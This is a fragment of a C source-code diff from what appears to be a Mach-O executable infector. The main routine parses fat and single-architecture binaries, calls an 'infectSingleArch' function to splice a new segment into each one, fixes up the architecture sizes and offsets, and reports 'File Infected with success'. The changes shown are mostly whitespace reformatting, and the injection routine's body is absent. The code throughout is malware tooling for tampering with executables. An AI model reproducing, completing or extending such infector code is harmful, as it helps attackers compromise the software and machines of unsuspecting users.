+            archOffset    = SWAP_LONG(f_arch->offset);
+            fArchSize     = SWAP_LONG(f_arch->size);
 #ifdef DEBUG
             printf ("[ii] cputype: %d\n", cputype);
             printf ("[ii] archOffset: 0x%x\n", archOffset);
@@ -1758,39 +1814,39 @@ main (int argc, _mChar *argv[])
 
                 if (otherFound == 1)
                   {
-                    offsetToResources = infectSingleArch ((char *)(inputFilePointer),
-                                                          (char *)(outputFilePointer),
-                                                          archOffset,
-                                                          0,//arch_offt_padded,
-                                                          gInputFileSize,
-                                                          outputFileSize);
+                    offsetToResources = infectSingleArch((char *)(inputFilePointer),
+                                                         (char *)(outputFilePointer),
+                                                         archOffset,
+                                                         0,//arch_offt_padded,
+                                                         gInputFileSize,
+                                                         outputFileSize);
                   }
                 else
                   {
-                    offsetToResources = infectSingleArch ((char *)(inputFilePointer),
-                                                          (char *)(outputFilePointer),
-                                                          archOffset,
-                                                          0,//arch_offt_padded,
-                                                          fArchSize,
-                                                          outputFileSize);
+                    offsetToResources = infectSingleArch((char *)(inputFilePointer),
+                                                         (char *)(outputFilePointer),
+                                                         archOffset,
+                                                         0,//arch_offt_padded,
+                                                         fArchSize,
+                                                         outputFileSize);
                   }
 
-                gShiftSize += sizeof (struct segment_command)
+                gShiftSize += sizeof(struct segment_command)
                               + outputFileSize
                               + offsetToResources;
                 
 #ifdef DEBUG
                 printf("offsetToRes: %d\n", offsetToResources);
 #endif
-                fArchSize += sizeof (struct segment_command)
+                fArchSize += sizeof(struct segment_command)
                              + outputFileSize
                              + offsetToResources;
                 
-                f_arch->size = SWAP_LONG (fArchSize);
+                f_arch->size = SWAP_LONG(fArchSize);
                 
                 if (i > 0)
                   {
-                    f_arch->offset = SWAP_LONG (arch_offt_padded);
+                    f_arch->offset = SWAP_LONG(arch_offt_padded);
                   }
               }
             /*else if (cputype == CPU_TYPE_X86_64)
@@ -1870,9 +1926,9 @@ main (int argc, _mChar *argv[])
 
             memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));
             */
-            free (f_arch);
-            inputOffset   += sizeof (struct fat_arch);
-            gOutSize = fArchSize;
+            free(f_arch);
+            inputOffset += sizeof(struct fat_arch);
+            gOutSize     = fArchSize;
             //outputOffset  += sizeof (struct fat_arch);
           }
         
@@ -1881,14 +1937,14 @@ main (int argc, _mChar *argv[])
     case kMachBinary:
       {
         gFileType = 3;
-        printf ("[ii] Mach Binary found\n");
+        printf("[ii] Mach Binary found\n");
         
-        if ((offsetToResources = infectSingleArch (inputFilePointer,
-                                                   outputFilePointer,
-                                                   0,
-                                                   0,
-                                                   gInputFileSize,
-                                                   outputFileSize)) < 0)
+        if ((offsetToResources = infectSingleArch(inputFilePointer,
+                                                  outputFilePointer,
+                                                  0,
+                                                  0,
+                                                  gInputFileSize,
+                                                  outputFileSize)) < 0)
           {
             printf("[ee] An error occurred while infecting the binary\n");
             
@@ -1920,7 +1976,7 @@ main (int argc, _mChar *argv[])
       break;
     }
 
-  printf ("[ii] File Infected with success\n");
+  printf("[ii] File Infected with success\n");
 
 #ifdef WIN32
   if (inputFilePointer != NULL)
